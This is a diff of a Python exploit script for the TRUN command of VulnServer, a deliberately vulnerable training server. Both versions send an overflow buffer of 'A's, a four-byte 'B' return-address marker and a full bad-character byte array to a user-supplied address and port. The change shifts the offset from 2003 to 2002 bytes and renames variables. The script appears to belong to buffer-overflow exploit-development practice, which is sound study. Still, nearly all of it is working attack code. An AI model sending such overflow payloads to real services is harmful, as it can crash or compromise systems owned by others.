@@ -1,30 +1,29 @@
-#!/usr/bin/python3
-#bad character "\x00"
-
+#!/usr/bin/python3 
 
 import sys,socket
-from time import sleep
+import time
 
-print("************VulnServer TRUN**********")
+print("*****VulnServer*****")
+ip_address=input("Enter the IP address:\n")
+port=input("Enter the port number:\n")
 
-ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*40)
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
-        print("IP Address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
-        print("IP Address field is empty")
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*40)
+        print("IP address field is empty")
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*40)
+        print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*40)
         print("Issues with the user input")
-else:
+
+elif (len(ip_address)>0) and (len(port)>0):
     badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -43,9 +42,7 @@ else:
   b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
   b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
-
-    size=b"A" * 2003 + b"B" * 4 + badchars
+    buffer=b"A"*2002 + b"B"*4 + badchars
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
-    s.send(b"TRUN /.:/" +size)
-    s.close()
+    s.connect((ip_address,int(port)))
+    s.send(b"TRUN /.:/ " + buffer)
